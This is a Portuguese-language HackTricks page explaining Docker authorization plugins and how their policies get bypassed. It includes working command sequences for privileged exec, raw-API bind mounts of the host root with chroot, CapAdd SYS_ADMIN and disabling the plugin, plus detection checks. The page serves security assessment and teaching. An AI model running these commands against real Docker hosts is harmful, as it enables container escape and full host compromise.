# Plugins de autorização em runtime

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

Os plugins de autorização em runtime são uma camada extra de políticas que decide se um caller pode executar uma determinada ação do daemon. Docker é o exemplo clássico. Por padrão, qualquer pessoa que possa se comunicar com o Docker daemon tem, efetivamente, amplo controle sobre ele. Os plugins de autorização tentam restringir esse modelo examinando o usuário autenticado e a operação de API solicitada e, em seguida, permitindo ou negando a solicitação de acordo com a política.

Este tópico merece sua própria página porque altera o modelo de exploração quando um atacante já tem acesso a uma Docker API ou a um usuário no grupo `docker`. Nesses ambientes, a questão já não é apenas "posso alcançar o daemon?", mas também "o daemon está protegido por uma camada de autorização e, se estiver, essa camada pode ser bypassed por meio de endpoints não tratados, parsing fraco de JSON ou permissões de gerenciamento de plugins?"

## Operação

Quando uma solicitação chega ao Docker daemon, o subsistema de autorização pode encaminhar o contexto da solicitação para um ou mais plugins instalados. O plugin vê a identidade do usuário autenticado, os detalhes da solicitação, headers selecionados e partes do body da solicitação ou da resposta quando o content type é adequado. Vários plugins podem ser encadeados, e o acesso só é concedido se todos os plugins permitirem a solicitação.

Esse modelo parece sólido, mas sua segurança depende inteiramente de quão completamente o autor da política compreendeu a API. Um plugin que bloqueia `docker run --privileged`, mas ignora `docker exec`, não considera chaves JSON alternativas, como `Binds` no nível superior, ou permite a administração de plugins pode criar uma falsa sensação de restrição, enquanto ainda deixa caminhos diretos de privilege escalation abertos.

## Alvos comuns de plugins

Áreas importantes para revisão da política incluem:

- endpoints de criação de containers
- campos de `HostConfig`, como `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` e opções de compartilhamento de namespaces
- comportamento de `docker exec`
- endpoints de gerenciamento de plugins
- qualquer endpoint que possa acionar indiretamente ações de runtime fora do modelo de política pretendido

Historicamente, exemplos como o plugin `authz` da Twistlock e plugins educacionais simples, como `authobot`, tornaram esse modelo fácil de estudar porque seus arquivos de política e code paths mostravam como o mapeamento entre endpoints e ações era realmente implementado. Para trabalhos de assessment, a lição importante é que o autor da política precisa compreender toda a superfície da API, e não apenas os comandos mais visíveis da CLI.

## Abuso

O primeiro objetivo é descobrir o que realmente está bloqueado. Se o daemon negar uma ação, o erro frequentemente faz leak do nome do plugin, o que ajuda a identificar o controle em uso:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Se você precisar de uma criação de perfil mais ampla dos endpoints, ferramentas como `docker_auth_profiler` são úteis porque automatizam a tarefa repetitiva de verificar quais rotas da API e estruturas JSON são realmente permitidas pelo plugin.

Se o ambiente usar um plugin personalizado e você puder interagir com a API, enumere quais campos de objeto são realmente filtrados:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Essas verificações são importantes porque muitas falhas de autorização são específicas de campos, e não de conceitos. Um plugin pode rejeitar um padrão da CLI sem bloquear completamente a estrutura equivalente da API.

### Exemplo completo: `docker exec` adiciona privilégios após a criação do container

Uma policy que bloqueia a criação de containers privilegiados, mas permite a criação de containers unconfined juntamente com `docker exec`, ainda pode ser bypassed:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Se o daemon aceitar a segunda etapa, o usuário recuperou um processo interativo privilegiado dentro de um container que o autor da policy acreditava estar restrito.

### Exemplo completo: Bind Mount por meio da API bruta

Algumas policies vulneráveis inspecionam apenas um formato JSON. Se o bind mount do root filesystem não for bloqueado de forma consistente, o host ainda poderá ser montado:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
A mesma ideia também pode aparecer em `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
O impacto é um escape completo do filesystem do host. O detalhe interessante é que o bypass ocorre devido à cobertura incompleta da policy, e não por causa de um bug no kernel.

### Exemplo completo: atributo de capability não verificado

Se a policy esquecer de filtrar um atributo relacionado a capabilities, o attacker poderá criar um container que recupera uma capability perigosa:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Quando `CAP_SYS_ADMIN` ou uma capability igualmente poderosa está presente, muitas técnicas de breakout descritas em [capabilities.md](protections/capabilities.md) e [privileged-containers.md](privileged-containers.md) tornam-se acessíveis.

### Exemplo completo: desativando o plugin

Se as operações de gerenciamento de plugins forem permitidas, o bypass mais simples pode ser desativar completamente o controle:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Esta é uma falha de política no nível do control-plane. A camada de autorização existe, mas o usuário que ela deveria restringir ainda mantém a permissão para desativá-la.

## Verificações

Estes comandos têm como objetivo identificar se existe uma camada de políticas e se ela parece completa ou superficial.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
O que é interessante aqui:

- Mensagens de negação que incluem o nome de um plugin confirmam uma camada de autorização e geralmente revelam a implementação exata.
- Uma lista de plugins visível para o atacante pode ser suficiente para descobrir se operações de desativação ou reconfiguração são possíveis.
- Uma policy que bloqueia apenas ações óbvias da CLI, mas não requisições brutas à API, deve ser considerada passível de bypass até que se prove o contrário.

## Padrões de Runtime

| Runtime / platform | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Não habilitado por padrão | O acesso ao daemon é efetivamente tudo ou nada, a menos que um authorization plugin esteja configurado | policy incompleta do plugin, blacklists em vez de allowlists, permitir o gerenciamento de plugins, pontos cegos no nível dos campos |
| Podman | Não possui um equivalente direto comum | O Podman normalmente depende mais de permissões Unix, execução rootless e decisões de exposição da API do que de authz plugins no estilo do Docker | expor amplamente uma API do Podman executada como root, permissões fracas no socket |
| containerd / CRI-O | Modelo de controle diferente | Esses runtimes normalmente dependem de permissões no socket, limites de confiança do node e controles do orchestrator em camadas superiores, em vez de authz plugins do Docker | montar o socket em workloads, pressupostos fracos de confiança local no node |
| Kubernetes | Usa authn/authz nas camadas do API-server e do kubelet, não Docker authz plugins | RBAC do cluster e admission controls são a principal camada de policy | RBAC excessivamente amplo, admission policy fraca, expor diretamente APIs do kubelet ou do runtime |

{{#include ../../../banners/hacktricks-training.md}}
